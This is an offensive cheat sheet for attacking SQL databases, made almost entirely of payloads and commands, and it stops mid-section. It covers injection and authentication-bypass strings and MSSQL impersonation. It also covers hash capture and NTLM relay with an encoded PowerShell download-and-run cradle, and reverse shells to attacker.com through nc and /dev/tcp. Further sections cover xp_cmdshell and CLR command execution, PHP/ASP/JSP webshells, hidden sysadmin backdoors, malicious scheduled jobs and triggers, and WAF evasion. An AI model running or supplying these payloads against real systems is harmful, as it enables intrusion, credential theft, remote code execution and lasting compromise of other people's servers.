# Comprehensive SQL Attack Guide

## Quick Wins Table

| Test Type | Payload | Expected Result | Next Steps |
|:-------:|:-------|:----------------|:-----------|
| **Basic Error** | `'` or `"` | SQL error message | Try error-based techniques → Extract version → List tables |
| **Auth Bypass** | `admin'--` or `' OR '1'='1'--` | Login success | Enumerate admin panel → Extract other users → Escalate privileges |
| **UNION Test** | `' ORDER BY 1--` (increment) | No error until column count exceeded | Use column count → UNION SELECT NULL,NULL → Extract data |
| **Blind Boolean** | `' AND 1=1--` vs `' AND 1=2--` | Different responses | Create binary search → Extract data bit by bit → Dump tables |
| **Time Based** | `' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--` | 5 second delay | Use for blind extraction → Automate with sqlmap → Extract data |
| **🔹 AD Discovery** | `setspn -T domain -Q MSSQLSvc/*` | List of SQL servers | Target discovered servers → Check authentication → Attempt access |
| **🔹 Windows Auth** | `Integrated Security=True` | Access without password | Enumerate privileges → Look for impersonation → Escalate |
| **🔹 UNC Injection** | `EXEC xp_dirtree '\\attacker\share'` | SMB connection attempt | Capture hash with Responder → Crack or relay → System access |
| **🔹 Impersonation** | `EXECUTE AS LOGIN='sa'` | Elevated SQL context | Enable xp_cmdshell → Execute commands → System compromise |
| **🔹 Linked Servers** | `EXEC sp_linkedservers` | List of linked servers | Test access → Pivot through links → Expand access |
| **🔹 CLR Assembly** | `CREATE ASSEMBLY FROM 0x...` | Custom code loaded | Execute custom methods → Fileless code execution |
| **Version Check** | `' UNION SELECT @@version,NULL--` | Database version | Match version exploits → Use DB-specific attacks → Escalate access |
| **File Read** | `' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--` | File contents | Read config files → Find credentials → Access system files |
| **Command Execute** | `'; EXEC xp_cmdshell 'whoami'--` | Command output | Run system commands → Create webshell → Gain system access |
| **Bulk Extract** | `' UNION SELECT GROUP_CONCAT(table_name),NULL FROM information_schema.tables--` | List of tables | Map database → Extract sensitive tables → Dump credentials |
| **WAF Bypass** | `' UnIoN/**/SeLeCt/**/1,2--` | Successful bypass | Use successful bypass → Chain with other attacks → Extract data |

**Database Compatibility Legend:**
- `[All]` - Works across all databases
- `[MSSQL]` - Microsoft SQL Server specific
- `[MySQL]` - MySQL specific  
- `[PostgreSQL]` - PostgreSQL specific
- `[Oracle]` - Oracle specific

## Attack Progression Paths

### Path 1: Error-Based Discovery → Full Extraction
```sql
# 1. Trigger Error [All]
'  # Basic quote test
"  # Double quote test
)'  # Bracket test
'abc  # String termination test

# 2. Version Detection
' UNION SELECT @@version,NULL--  # [MSSQL] Get SQL Server version
' UNION SELECT version(),NULL--  # [MySQL/PostgreSQL] Get database version
' AND 1=convert(int,@@version)--  # [MSSQL] Force type conversion error to leak version

# 3. Column Enumeration [All]
' ORDER BY 1--  # Start column count
' ORDER BY 2--  # Increment until error occurs
' UNION SELECT NULL,NULL--  # Match discovered column count

# 4. Data Extraction [All]
' UNION SELECT table_name,NULL FROM information_schema.tables--  # Standard table enumeration
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--  # Column discovery
' UNION SELECT username,password FROM users--  # Extract credentials

# Caveat: Error-based injection may fail if:
# - Custom error pages suppress database errors
# - WAF filters common error patterns
# - Application handles errors gracefully

### Path 2: Blind Boolean → Data Extraction
```sql
# 1. Confirm Boolean Control [All]
admin' AND 1=1--  # Should succeed - returns normal page
admin' AND 1=2--  # Should fail - returns different/error page

# 2. Test Table Existence [MySQL/PostgreSQL]
admin' AND (SELECT 'x' FROM users LIMIT 1)='x'--  # True if table exists
# Alternative for MSSQL:
admin' AND (SELECT COUNT(*) FROM users)>0--  # Test table existence

# 3. Extract Data Length [MySQL]
admin' AND (SELECT LENGTH(username) FROM users WHERE id=1)=5--  # Test username length
# MSSQL Alternative:
admin' AND (SELECT LEN(username) FROM users WHERE id=1)=5--  # Test username length

# 4. Extract Data (character by character) [All]
admin' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1),1,1))=97--  # Test if first char is 'a'
# Continue for each position using binary search (97-122 range)
# MSSQL Alternative:
admin' AND ASCII(SUBSTRING((SELECT TOP 1 username FROM users),1,1))=97--  # Test first char

# 5. Automate with SQLMap [All]
sqlmap -u "http://target/page.php?id=1" --current-db  # Get current database
sqlmap -u "http://target/page.php?id=1" -D dbname --tables  # Get all tables
sqlmap -u "http://target/page.php?id=1" -D dbname -T users --dump  # Dump user table

# Caveat: Boolean injection may fail if:
# - Application returns same response for both true/false
# - WAF filters common SQL patterns
# - Database errors are suppressed

### Path 3: Time-Based → Blind Extraction
```sql
# 1. Confirm Time Control
'; IF 1=1 WAITFOR DELAY '0:0:5'--  # [MSSQL] Delay if true
' AND SLEEP(5)--  # [MySQL] Delay for 5 seconds
' AND 1=(SELECT 1 FROM pg_sleep(5))--  # [PostgreSQL] Delay using pg_sleep function

# 2. Test Table Existence [MSSQL]
'; IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '0:0:5'--  # Delay if table exists
# MySQL Alternative:
' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)--  # Conditional delay

# 3. Data Length Discovery [MSSQL]
'; IF (SELECT LEN(username) FROM users WHERE id=1)=5 WAITFOR DELAY '0:0:5'--  # Test username length
# MySQL Alternative:
' AND IF((SELECT LENGTH(username) FROM users WHERE id=1)=5,SLEEP(5),0)--  # Test username length

# 4. Character Extraction [MSSQL]
'; IF ASCII(SUBSTRING((SELECT TOP 1 username FROM users),1,1))=97 WAITFOR DELAY '0:0:5'--  # Test first char
# MySQL Alternative:
' AND IF(ASCII(SUBSTRING((SELECT username FROM users LIMIT 1),1,1))=97,SLEEP(5),0)--  # Test first char

# 5. Automate with SQLMap [All]
sqlmap -u "http://target/page.php?id=1" --technique=T  # Time-based techniques only
sqlmap -u "http://target/page.php?id=1" --technique=T --dump  # Extract all data

# Caveat: Time-based injection may fail if:
# - Database has query timeouts disabled
# - Network latency interferes with timing
# - Application implements request rate limiting
# - Database caches query results

### Path 4: 🔹 Enterprise Network Discovery → Domain Compromise
```powershell
# 1. AD-Based SQL Server Discovery
setspn -T corp1 -Q MSSQLSvc/*
GetUserSPNs.ps1 PowerShell script for SQL enumeration

# 2. Windows Authentication Testing
String conString = "Server = dc01.corp1.com; Database = master; Integrated Security = True;";

# 3. Hash Capture Setup
responder -I tun0
EXEC master..xp_dirtree "\\192.168.119.120\\test";

# 4. Hash Relaying
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.6 -c 'powershell -enc ...'

# 5. Privilege Escalation
EXECUTE AS LOGIN = 'sa';
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

### Path 5: 🔹 Hybrid Attack Chain → Complete Environment Takeover
```sql
# 1. Initial Web Access + SQL Injection
' UNION SELECT @@version,NULL--  # Get version
' AND 1=convert(int,@@version)--  # Force error for version

# 2. Pivot to Internal SQL Discovery
'; EXEC xp_dirtree '\\internal-sql\share'--  # Discover internal SQL servers

# 3. Capture Service Account Hashes
# Setup Responder, trigger UNC connections from compromised web app

# 4. Relay to Domain Controllers
impacket-ntlmrelayx -t dc01.corp1.com -c 'powershell -enc ...'

# 5. Linked Server Enumeration
EXEC sp_linkedservers;
EXEC ('sp_linkedservers') AT DC01;

# 6. Multi-Hop Pivoting
select mylogin from openquery("dc01", 'select mylogin from openquery("appsrv01", ''select SYSTEM_USER as mylogin'')')

# 7. Custom Assembly Deployment
CREATE ASSEMBLY myAssembly FROM 0x4D5A900... WITH PERMISSION_SET = UNSAFE;
CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];
EXEC cmdExec 'whoami';
```

## Discovery & Enumeration

### Traditional Web-Based Discovery
```sql
# Basic Error Testing
'  # Single quote
"  # Double quote
)'  # Bracket
'abc  # String termination

# Version Detection
' UNION SELECT @@version,NULL--  # MSSQL
' UNION SELECT version(),NULL--  # MySQL/PostgreSQL
SELECT @@version  # Direct MSSQL
SELECT version()  # Direct MySQL/PostgreSQL

# Database Enumeration
SELECT name FROM master..sysdatabases  # MSSQL databases
SELECT schema_name FROM information_schema.schemata  # MySQL/PostgreSQL schemas
SELECT datname FROM pg_database  # PostgreSQL databases

# Table Enumeration
SELECT table_name FROM information_schema.tables  # Standard
SELECT name FROM sysobjects WHERE xtype='U'  # MSSQL
SHOW TABLES  # MySQL
```

### 🔹 Enterprise Network Discovery
```powershell
# AD SPN Enumeration
setspn -T corp1 -Q MSSQLSvc/*
setspn -T domain.com -Q MSSQLSvc/*

# PowerShell SQL Discovery
.\GetUserSPNs.ps1

# Network Scanning
nmap -p 1433,1434,4022,5022 192.168.1.0/24
nmap -sV -p 1433 --script ms-sql-info 192.168.1.100

# Service Account Enumeration
SELECT distinct b.name FROM sys.server_permissions a 
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id 
WHERE a.permission_name = 'IMPERSONATE'

# SQL Server Instance Discovery
SELECT SERVERPROPERTY('InstanceName')
SELECT @@SERVICENAME
SELECT SERVERPROPERTY('MachineName')
```

## Authentication Methods

### SQL Authentication Bypass
```sql
# Basic Bypasses
admin'--
admin' #
admin' /*
' OR '1'='1
') OR ('1'='1

# More Complex Bypasses
' OR 'x'='x
' OR 1=1 LIMIT 1--
' OR '1'='1' LIMIT 1 -- -+
' OR 1=1; DROP members--

# Create Admin Session
' UNION SELECT 1,'admin','81dc9bdb52d04dc20036dbd8313ed055',1--  # MD5 hash of '1234'
SELECT * FROM users WHERE username='' OR '1'='1' AND password='' OR '1'='1'
```

### 🔹 Windows Authentication & Kerberos Integration
```csharp
// Windows Authentication without passwords
String conString = "Server = dc01.corp1.com; Database = master; Integrated Security = True;";

// C# Connection Example
using System.Data.SqlClient;
SqlConnection con = new SqlConnection(conString);
con.Open();

// Check current context
String query = "SELECT SYSTEM_USER;";
SqlCommand command = new SqlCommand(query, con);
SqlDataReader reader = command.ExecuteReader();
reader.Read();
Console.WriteLine("Executing in the context of: " + reader[0]);
```

```sql
-- SQL Server Authentication Context
SELECT SYSTEM_USER  # Current login
SELECT USER_NAME()  # Current database user
SELECT ORIGINAL_LOGIN()  # Original login before impersonation
SELECT SESSION_USER  # Current session user
SELECT SUSER_SNAME()  # Security identifier name

-- Check Role Memberships
SELECT IS_SRVROLEMEMBER('sysadmin')  # Check sysadmin role
SELECT IS_MEMBER('db_owner')  # Check database owner role
SELECT IS_SRVROLEMEMBER('public')  # Check public role
```

## Initial Attack Vectors

### Traditional SQL Injection
```sql
# Error-Based Injection
' AND 1=convert(int,(SELECT @@version))--
' AND 1=db_name()--
' AND (SELECT * FROM USERS) IS NULL--

# Boolean Blind Injection
admin' AND 1=1--  # True condition
admin' AND 1=2--  # False condition
admin' AND (SELECT 'x' FROM users LIMIT 1)='x'--  # Table exists

# Time-Based Injection
'; IF 1=1 WAITFOR DELAY '0:0:5'--  # MSSQL
' AND SLEEP(5)--  # MySQL
' AND 1=(SELECT 1 FROM pg_sleep(5))--  # PostgreSQL

# UNION-Based Injection
' UNION SELECT 1,2,3--  # Column count test
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password FROM users--
```

### 🔹 UNC Path Injection for Hash Capture
```sql
-- Force SMB Connection for Hash Capture
EXEC master..xp_dirtree "\\192.168.119.120\\test";
EXEC master..xp_dirtree "\\attacker-ip\share";

-- Alternative Procedures for UNC Injection
EXEC master..xp_fileexist '\\attacker-ip\share\test.txt';
EXEC master..xp_subdirs '\\attacker-ip\share';

-- C# Implementation
String query = "EXEC master..xp_dirtree \"\\\\192.168.119.120\\\\test\";";
SqlCommand command = new SqlCommand(query, con);
SqlDataReader reader = command.ExecuteReader();
```

```bash
# Responder Setup for Hash Capture
sudo responder -I tun0

# Expected Output
[SMB] NTLMv2-SSP Client   : 192.168.50.5
[SMB] NTLMv2-SSP Username : CORP1\sqlsvc
[SMB] NTLMv2-SSP Hash     : sqlsvc::CORP1:2f6c6475053e92cc:56335D1CE7EACE603C8E53160F2C0CB0:...
```

### 🔹 Net-NTLM Relaying from SQL Servers
```bash
# Relay Setup
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.6 -c 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADIANQAxAC4AMQA1ADEALwByAHUAbgAuAHQAeAB0ACcAKQAgAHwAIABJAEUAWAA='

# PowerShell Base64 Encoding Alternative
python3 -c "import base64; print(base64.b64encode('(New-Object System.Net.WebClient).DownloadString(\\'http://192.168.251.151/run.txt\\') | IEX'.encode('utf-16le')).decode())"

# Hash Cracking Alternative
hashcat -m 5600 hash.txt dict.txt --force
```

## Privilege Escalation

### Database Privilege Escalation
```sql
# Check Current Privileges
SELECT user FROM mysql.user  # MySQL users
SELECT * FROM information_schema.user_privileges  # General privileges
SELECT * FROM sys.database_principals  # MSSQL database principals
SELECT * FROM sys.server_principals  # MSSQL server principals

# Grant Privileges (if possible)
GRANT ALL PRIVILEGES ON *.* TO 'user'@'%'  # MySQL
GRANT db_owner TO user  # MSSQL
ALTER ROLE db_owner ADD MEMBER user  # MSSQL 2012+

# Create New Admin User
'; INSERT INTO users (username,password,admin) VALUES ('evil','evil',1)--
```

### 🔹 SQL Server Impersonation Attacks
```sql
-- Login-Level Impersonation
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;  # Verify context
REVERT;  # Return to original context

-- User-Level Impersonation
use msdb;
EXECUTE AS USER = 'dbo';
SELECT USER_NAME();  # Verify context
REVERT;

-- Enumerate Impersonation Permissions
SELECT distinct b.name FROM sys.server_permissions a 
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id 
WHERE a.permission_name = 'IMPERSONATE'

-- Test Impersonation Capabilities
EXECUTE AS LOGIN = 'sa';
SELECT IS_SRVROLEMEMBER('sysadmin');  # Check if sysadmin
REVERT;

-- C# Implementation
String executeas = "EXECUTE AS LOGIN = 'sa';";
SqlCommand command = new SqlCommand(executeas, con);
SqlDataReader reader = command.ExecuteReader();
reader.Close();

// Verify impersonation
String querylogin = "SELECT SYSTEM_USER;";
command = new SqlCommand(querylogin, con);
reader = command.ExecuteReader();
reader.Read();
Console.WriteLine("Executing in the context of: " + reader[0]);
reader.Close();
```

### 🔹 TRUSTWORTHY Database Property Exploitation
```sql
-- Check TRUSTWORTHY Property
SELECT name, is_trustworthy_on FROM sys.databases;

-- Only msdb has TRUSTWORTHY enabled by default
use msdb;
EXECUTE AS USER = 'dbo';  # dbo has sysadmin role in msdb

-- Verify Elevated Privileges
SELECT IS_SRVROLEMEMBER('sysadmin');  # Should return 1
SELECT USER_NAME();  # Should return 'dbo'

-- Perform Privileged Actions
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

## Code Execution

### Traditional Command Execution
```sql
# MSSQL xp_cmdshell
EXEC sp_configure 'show advanced options',1;RECONFIGURE
EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE
EXEC master..xp_cmdshell 'whoami'
EXEC master..xp_cmdshell 'net user hacker password /add'
EXEC master..xp_cmdshell 'net localgroup administrators hacker /add'

# MySQL Command Execution
' UNION SELECT NULL,'nc -e /bin/bash attacker.com 4444' INTO OUTFILE '/var/www/rev.sh'--
' UNION SELECT NULL,'chmod +x /var/www/rev.sh' INTO OUTFILE '/var/www/chmod.sh'--

# PostgreSQL Command Execution
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"';
```

### 🔹 OLE Automation via sp_OACreate
```sql
-- Enable OLE Automation
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures',1; RECONFIGURE;

-- Create and Execute OLE Object
DECLARE @myshell INT;
EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT;
EXEC sp_oamethod @myshell, 'run', null, 'cmd /c "echo Test > C:\Tools\file.txt"';

-- Alternative Commands
DECLARE @shell INT;
EXEC sp_oacreate 'wscript.shell', @shell OUT;
EXEC sp_oamethod @shell, 'run', NULL, 'cmd.exe /c ping attacker.com -n 5';

-- File Operations
DECLARE @fso INT;
EXEC sp_oacreate 'Scripting.FileSystemObject', @fso OUT;
EXEC sp_oamethod @fso, 'CreateTextFile', NULL, 'C:\temp\test.txt', 2, True;
```

### 🔹 Custom CLR Assembly Injection
```csharp
// C# Assembly Code - Fileless SQL Server Command Execution
using System;
using Microsoft.SqlServer.Server;
using System.Data.SqlTypes;
using System.Diagnostics;

public class StoredProcedures
{
    [Microsoft.SqlServer.Server.SqlProcedure]  // Mark as SQL stored procedure
    public static void cmdExec (SqlString execCommand)
    {
        // Create new process object for command execution
        Process proc = new Process();
        
        // Set up command execution environment
        proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
        proc.StartInfo.Arguments = string.Format(@" /C {0}", execCommand);
        proc.StartInfo.UseShellExecute = false;  // Don't use shell execute
        proc.StartInfo.RedirectStandardOutput = true;  // Capture command output
        
        // Start the process
        proc.Start();

        // Set up SQL data record for output return
        SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", System.Data.SqlDbType.NVarChar, 4000));
        SqlContext.Pipe.SendResultsStart(record);
        
        // Capture and return command output
        record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());
        SqlContext.Pipe.SendResultsRow(record);
        SqlContext.Pipe.SendResultsEnd();

        // Clean up process
        proc.WaitForExit();
        proc.Close();
    }
}
```

```sql
-- Enable CLR Integration [MSSQL]
-- Caveat: Requires sysadmin role and database owner permissions
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'clr enabled',1; RECONFIGURE;
EXEC sp_configure 'clr strict security', 0; RECONFIGURE;  -- Bypass security restrictions

-- Create Assembly from File [MSSQL]
-- Caveat: Requires file access on SQL server and UNSAFE permission
CREATE ASSEMBLY myAssembly FROM 'c:\tools\cmdExec.dll' WITH PERMISSION_SET = UNSAFE;

-- Create Assembly from Hex (Fileless) [MSSQL]
-- Advantage: No file write required, completely in-memory
CREATE ASSEMBLY my_assembly FROM 0x4D5A900... WITH PERMISSION_SET = UNSAFE;

-- Create Procedure from Assembly [MSSQL]
CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];

-- Execute Custom Procedure [MSSQL]
EXEC cmdExec 'whoami';
EXEC cmdExec 'net user';
EXEC cmdExec 'dir C:\';
```

```powershell
# Convert DLL to Hex String [All]
# Purpose: Enable fileless assembly deployment
$assemblyFile = "\\192.168.119.120\visualstudio\Sql\cmdExec\bin\x64\Release\cmdExec.dll"
$stringBuilder = New-Object -Type System.Text.StringBuilder 

# Read assembly file byte by byte
$fileStream = [IO.File]::OpenRead($assemblyFile)
while (($byte = $fileStream.ReadByte()) -gt -1) {
    $stringBuilder.Append($byte.ToString("X2")) | Out-Null
}

# Output hex string to file
$stringBuilder.ToString() -join "" | Out-File c:\Tools\cmdExec.txt

# Caveat: Requires PowerShell and file system access
```

```sql
-- Enable CLR Integration
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'clr enabled',1; RECONFIGURE;
EXEC sp_configure 'clr strict security', 0; RECONFIGURE;

-- Create Assembly from File
CREATE ASSEMBLY myAssembly FROM 'c:\tools\cmdExec.dll' WITH PERMISSION_SET = UNSAFE;

-- Create Assembly from Hex (Fileless)
CREATE ASSEMBLY my_assembly FROM 0x4D5A900... WITH PERMISSION_SET = UNSAFE;

-- Create Procedure from Assembly
CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];

-- Execute Custom Procedure
EXEC cmdExec 'whoami';
EXEC cmdExec 'net user';
EXEC cmdExec 'dir C:\';
```

### 🔹 Assembly Hex Embedding
```powershell
# Convert DLL to Hex String
$assemblyFile = "\\192.168.119.120\visualstudio\Sql\cmdExec\bin\x64\Release\cmdExec.dll"
$stringBuilder = New-Object -Type System.Text.StringBuilder 

$fileStream = [IO.File]::OpenRead($assemblyFile)
while (($byte = $fileStream.ReadByte()) -gt -1) {
    $stringBuilder.Append($byte.ToString("X2")) | Out-Null
}
$stringBuilder.ToString() -join "" | Out-File c:\Tools\cmdExec.txt
```

## Lateral Movement

### Cross-Database Attacks
```sql
# Direct Cross-Database Access
USE master; SELECT * FROM other_db.dbo.users
INSERT INTO other_db.dbo.users SELECT * FROM current_db.dbo.users

# MySQL Cross-Database
SELECT * FROM database2.table1
USE database2; SHOW TABLES;

# PostgreSQL Cross-Database
SELECT * FROM other_database.public.users
\c other_database
```

### 🔹 Linked Server Enumeration
```sql
-- Enumerate Linked Servers
EXEC sp_linkedservers;
SELECT * FROM master..sysservers;
SELECT * FROM sys.servers;

-- Test Linked Server Access
SELECT * FROM OPENQUERY([linked_server], 'SELECT @@version');
SELECT * FROM OPENQUERY([DC01], 'SELECT SYSTEM_USER');

-- Check Linked Server Configuration
EXEC sp_helplinkedsrvlogin 'linked_server';
EXEC sp_helpserver 'linked_server';
```

### 🔹 Linked Server Command Execution
```sql
-- Enable RPC on Linked Server
EXEC sp_serveroption 'linked_server', 'rpc out', 'true';

-- Execute Commands Through Linked Server
EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT DC01
EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT DC01
EXEC ('xp_cmdshell ''whoami''') AT DC01

-- PowerShell Execution Through Linked Server
EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT appsrv01') AT dc01

-- Base64 Encoded PowerShell for Linked Server
EXEC ('EXEC xp_cmdshell ''powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADIANQAxAC4AMQA1ADEALwByAHUAbgAuAHQAeAB0ACcAKQAgAHwAIABJAEUAWAA=''') AT DC01
```

### 🔹 Bidirectional Link Pivoting
```sql
-- Enumerate Links on Remote Server
EXEC ('sp_linkedservers') AT DC01;

-- Multi-Hop Query Through Links
select mylogin from openquery("dc01", 'select mylogin from openquery("appsrv01", ''select SYSTEM_USER as mylogin'')')

-- Check Security Context After Pivoting
select mylogin from openquery("dc01", 'select mylogin from openquery("appsrv01", ''select IS_SRVROLEMEMBER(''''sysadmin'''') as mylogin'')')

-- Execute Commands Through Multi-Hop Links
EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT appsrv01') AT dc01
EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT appsrv01') AT dc01
EXEC ('EXEC xp_cmdshell ''whoami''') AT appsrv01') AT dc01
```

## Data Exfiltration

### Traditional Data Extraction
```sql
# Bulk Data Extraction
SELECT * FROM users;
SELECT username,password FROM admin_users;
SELECT GROUP_CONCAT(username) FROM users;  # MySQL
SELECT STRING_AGG(username,',') FROM users;  # MSSQL
SELECT LISTAGG(username,',') WITHIN GROUP (ORDER BY username) FROM users;  # Oracle

# Conditional Extraction
SELECT * FROM users WHERE admin=1;
SELECT * FROM users WHERE password LIKE '%admin%';
SELECT * FROM users WHERE created_date > '2023-01-01';

# File-Based Exfiltration
' UNION SELECT username,password FROM users INTO OUTFILE '/tmp/users.txt'--
' UNION SELECT * FROM users INTO DUMPFILE '/tmp/users.csv'--
```

### 🔹 Enterprise Data Discovery
```sql
-- Sensitive Database Enumeration
SELECT name FROM master..sysdatabases WHERE name LIKE '%pass%' OR name LIKE '%cred%' OR name LIKE '%secret%';

-- Sensitive Table Enumeration
SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%user%' OR table_name LIKE '%pass%' OR table_name LIKE '%admin%';

-- Column-Level Search
SELECT table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%pass%' OR column_name LIKE '%user%' OR column_name LIKE '%email%';

-- Search for Credit Card Data
SELECT * FROM information_schema.columns WHERE data_type LIKE '%credit%' OR column_name LIKE '%card%';

-- Search for PII Data
SELECT table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%ssn%' OR column_name LIKE '%social%' OR column_name LIKE '%tax%';
```

### 🔹 Linked Server Data Access
```sql
-- Extract Data Through Linked Servers
SELECT * FROM OPENQUERY([linked_server], 'SELECT * FROM sensitive_db.dbo.users');

-- Bulk Data Transfer
INSERT INTO local_table SELECT * FROM OPENQUERY([linked_server], 'SELECT * FROM remote_table');

-- Cross-Server Data Aggregation
SELECT * FROM local_table
UNION ALL
SELECT * FROM OPENQUERY([linked_server], 'SELECT * FROM remote_table')
WHERE NOT EXISTS (SELECT 1 FROM local_table WHERE id = remote_table.id);

-- Linked Server Schema Enumeration
SELECT * FROM OPENQUERY([linked_server], 'SELECT table_name FROM information_schema.tables');
SELECT * FROM OPENQUERY([linked_server], 'SELECT column_name FROM information_schema.columns WHERE table_name = ''users''');
```

## Persistence & Post-Exploitation

### Traditional Webshell Creation
```sql
# PHP Webshell
' UNION SELECT NULL,'<?php system($_GET["cmd"]);?>' INTO OUTFILE '/var/www/shell.php'--

# ASP Webshell
'; EXEC sp_makewebtask 'c:\inetpub\wwwroot\shell.asp','SELECT ''<%=system("dir")%>'''--

# ASPX Webshell
EXEC master..xp_cmdshell 'echo ^<%@ Page Language="Jscript"%^>^<%eval(Request.Item["cmd"])%^> > c:\inetpub\wwwroot\shell.aspx'

# JSP Webshell
' UNION SELECT NULL,'<%@ page import="java.io.*" %><%if(request.getParameter("cmd")!=null){new java.io.PrintWriter(application.getRealPath("/")+request.getParameter("out")).println(request.getParameter("cmd"));}%>' INTO OUTFILE '/var/www/shell.jsp'--
```

### 🔹 SQL Server Persistence Mechanisms
```sql
-- Create Hidden Admin User
CREATE LOGIN [hidden$] WITH PASSWORD = 'ComplexPassword123!';
SP_ADDSRVROLEMEMBER 'hidden$', 'sysadmin';

-- Create Backdoor Stored Procedure
CREATE PROCEDURE dbo.sp_backdoor
@cmd NVARCHAR(MAX)
AS
BEGIN
    EXEC xp_cmdshell @cmd;
END;

-- Hide Procedure
EXEC sp_updateextendedproperty N'MS_DiagnosticPane_Enabled', N'1', N'user', N'dbo', N'procedure', N'sp_backdoor';

-- Trigger-Based Persistence
CREATE TRIGGER dbo.tr_login_audit
ON dbo.users
AFTER INSERT, UPDATE
AS
BEGIN
    DECLARE @cmd NVARCHAR(MAX);
    SET @cmd = 'powershell -enc "base64_encoded_payload"';
    EXEC xp_cmdshell @cmd;
END;
```

### 🔹 Service Account Abuse for Persistence
```sql
-- Service Account Enumeration
SELECT name, type_desc, is_disabled FROM sys.server_principals WHERE type = 'S';

-- Create Service Account Backdoor
CREATE LOGIN [SQLSvc$] FROM WINDOWS;
SP_ADDSRVROLEMEMBER 'SQLSvc$', 'sysadmin';

-- Scheduled Job Persistence
EXEC msdb.dbo.sp_add_job
    @job_name = N'Database Maintenance',
    @enabled = 1,
    @description = N'Backdoor job';

EXEC msdb.dbo.sp_add_jobstep
    @job_name = N'Database Maintenance',
    @step_name = N'Execute Command',
    @subsystem = N'CMDEXEC',
    @command = N'powershell -enc "backdoor_payload"',
    @retry_attempts = 3,
    @retry_interval = 5;

EXEC msdb.dbo.sp_add_schedule
    @schedule_name = N'Daily Schedule',
    @freq_type = 4,
    @freq_interval = 1,
    @active_start_time = 030000;

EXEC msdb.dbo.sp_attach_schedule
    @job_name = N'Database Maintenance',
    @schedule_name = N'Daily Schedule';

EXEC msdb.dbo.sp_add_jobserver
    @job_name = N'Database Maintenance';
```

### 🔹 Linked Server Backdoors
```sql
-- Create Persistent Linked Server
EXEC sp_addlinkedserver 
    @server = N'backdoor_server',
    @srvproduct = N'SQL Server';

EXEC sp_addlinkedsrvlogin 
    @rmtsrvname = N'backdoor_server',
    @useself = N'false',
    @locallogin = NULL,
    @rmtuser = N'backdoor_user',
    @rmtpassword = N'backdoor_pass';

-- Use Linked Server for Persistence
EXEC ('CREATE LOGIN backdoor_user WITH PASSWORD = ''backdoor_pass''') AT backdoor_server;
EXEC ('SP_ADDSRVROLEMEMBER ''backdoor_user'', ''sysadmin''') AT backdoor_server;
```

## Defense Evasion

### WAF Bypass Techniques
```sql
# Comment-Based Bypass
SeL/**/ecT  # Split keywords
%53%45%4c%45%43%54  # URL encode
UNI/**/ON SEL/**/ECT  # Multiple splits

# Encoding Bypass
CONCAT('SE','LECT')  # String concat
0x73656c656374  # Hex encode
CHAR(115,101,108,101,99,116)  # ASCII chars

# Case Variation
SeLeCt  # Mixed case
sElEcT  # Random case

# Whitespace Alternatives
SELECT%09column%09FROM%09table  # Tab
SELECT/**/column/**/FROM/**/table  # Comment
SELECT+column+FROM+table  # Plus sign

# Function Obfuscation
SUBSTRING(@@version,1,1)  # Instead of direct version
ASCII(SUBSTRING(@@version,1,1))  # Double encoding
```

### 🔹 SQL Server Security Bypass
```sql
-- Bypass xp_cmdshell Restrictions
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;

-- Bypass CLR Restrictions
